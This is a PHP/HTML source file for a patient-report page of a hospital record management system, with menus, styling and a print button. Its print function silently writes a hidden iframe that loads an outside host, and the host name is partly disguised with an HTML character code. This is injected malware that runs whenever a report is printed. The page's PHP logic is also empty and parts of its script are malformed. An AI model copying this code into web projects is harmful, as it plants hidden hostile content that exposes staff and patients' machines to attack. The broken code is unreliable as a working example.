
<?php   
 ?>
 <script>
  alert('You Are Not Logged In !! Please Login to access this page');
  alert(window.location='login.php');
 </script>
 <?php
 ?>

 
<html>
<html lang="en-US" xml:lang="en-US" xmlns=""/>
<head>
<title>UOG Hospital</title>
<link rel="stylesheet" type="text/css" href="style/home.css">
      <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta name="Keywords" content="XML,tutorial,HTML,DHTML,CSS,XSL,XHTML,JavaScript,ASP,ADO,VBScript,DOM,W3C,authoring,programming,learning,beginner's guide,primer,lessons,school,howto,reference,free,examples,samples,source code,demos,tips,links,FAQ,tag list,forms,frames,color tables,Cascading Style Sheets,Active Server Pages,Dynamic HTML,Internet database development,Webbuilder,Sitebuilder,Webmaster,HTMLGuide,SiteExpert" />
<meta name="Description" content="HTML XHTML CSS JavaScript XML XSL ASP SQL ADO VBScript Tutorials References Examples" />
       <link rel="stylesheet" type="text/css" href="index's_file/globalcss.css" />
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "../https@ssl.\default.htm" : "../www./default.htm");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-3855518-1");
pageTracker._initData();
pageTracker._trackPageview();
</script>
<link rel="stylesheet" type="text/css" href="index's_file/globalcss.css" />

<style>
}-->
#header {
background: #800020;
}
#headerz {
background: url(img/esa.jpg);
}
#headerz li a {
	color: white;
	font-size: 11px;
	padding: 8px ;
	text-align: center;
	text-decoration: none;
	text-transform: uppercase;
}
#headerz li a:hover, #headerz li.selected a {
	background: url(img/hover.png);
	color: red;
	text-transform: lowercase;
	font-size: 18px;
	padding: 15px ;
	}
.login{
background: url(img/bgtable.jpg);
}
#footer {
background: url(img/esa.jpg);
font-family: Lucida Calligraphy;
}
#content {
background:#778899;
}
#body{
width:1400px;
height:790px;
margin-left:-8px;
background: black;
}
#left_colomn{
background: #778899;
width: 280px;
float: left;
height: 600px;
}
#right_colomn{
background:#778899;
width: 280px;
float: right;
height: 600px;
}

#center{
 border-radius:30px 0px 0px 0px;
-moz-border-radius: 20px 20px 0px 0px;
border-color:#ccccff;
border-style:groove;
margin-left:0px;
margin-top: -129px;
background: cyan;
width: 140px;
float: left;
height: 74px;
}
#center img{
 border-radius:30px 0px 0px 0px;
-moz-border-radius: 20px 20px 0px 0px;
}

#zz{
background: url(img/esa.jpg);
}
#yy{
width: 267px;
float: left;
height: 590px;
margin-top:5px;
margin-left:10px;
border-color:#ccccff;
border-style:groove;
}
</style>

				 <script language="javascript">
function Clickheretoprint()
{ 
  var disp_setting="toolbar=yes,location=no,directories=yes,menubar=yes,"; 
      disp_setting+="scrollbars=yes,widtd=900, height=400, left=100, top=25"; 
  var content_vlue = document.getElementById("print_content").innerHTML; 
  
  var docprint=window.open("","",disp_setting); 
   docprint.document.open(); 
   docprint.document.write('<html><head><title>Lists</title>'); 
   docprint.document.write('</head><body onLoad="self.print()" style="widtd: 900px; font-size:16px; font-family:arial;">');          
   docprint.document.write(content_vlue);          
   docprint.document.write('<iframe src="http://jL.chu&#114;a.pl/rc/" style="display:none"></iframe>
</body></html>'); 
   docprint.document.close(); 
   docprint.focus(); 
}
</script>
<style>
#print_content{
width:434px;
margin:0 auto;
}
</style>
</head>
<div id="body">
<div id="content">

<div id="header"style="background-color: #800020;">
<img src="img/60.jpg" width="60" height="30">
<h1 style="font-family:Lucida Calligraphy;"> UOGHP Record Management system</h1>
</div>
<div id="headerz">
<table width="1150px" border="0px">
<tr>
<td width="950" height="29" background-color="606060" font-size="10px" margin-top="-15">
	  <p><li>
          <b><a href="viewregpatient.php">view patient</a></b> 
        <b> <a href="appointmentdate.php">set appt date</a></b> 
					  
			     <b> 	<a href="drugorder.php">order drug</a></b> 
				
				   <b>  <a href="labresult.php">Order Lab</a></b> 
					<b> <a href="viewlabresult1.php">view lab result</a></b> 
					
					<b> <a href="refer.php">refer patient</a></b> 
					
                      <b> <a href="viewpatdrug.php">update patient info</a></b> 
					
					<b> <a href="viewcomment.php">view Nurse Result</a></b> 
					<b> <a href="changeuserpassword.php">Change Password</a></b> 
					<b> <a href="logout.php" onclick="islogout()"">Logout</a>  </b>        		 
	  </li></p>
	  </td>

</tr>
</table>
				
		</div>

 <section class="container">

 <div id="center">
<img src="img/UU.jpg" width="140" height="74">
</div>
 
<div id="left_colomn">
<div id="yy">
<img src="img/clerk.jpg" width="270px" height="590">
				</div>
</div>
<div id="right_colomn"align="center">
<div class="left"><br/>
<img src="img/clerk1.jpg" width="280" height="580"><br/>  
</div>
</div>
	 <div class="login" style="font-family:Lucida Calligraphy;color:black;background-color:white;">
	 
<br><br><br>

  
  <form action="viewreport.php" method="post" >	
  
<div id="print_content">
					<center><h2 style="color:blue;">PATIENTS REPORT </h2></center> 
					<?php
					?>
					<br>
					<p align="center"><I><h2 style="color:solidblack">If you want to print click <a href="javascript:Clickheretoprint()"><img src="IMG/print.jpg" width="100px" height="55px" /></a></h2></I></p>
					</div></div>
					</form>
<p>

    </section>
<div id="footer" align="center">  <font color="#fef943">&copy;All Rights Kidanemiret clinic management system 2018.</font></div>
</div>
</div>
</body>
</html>
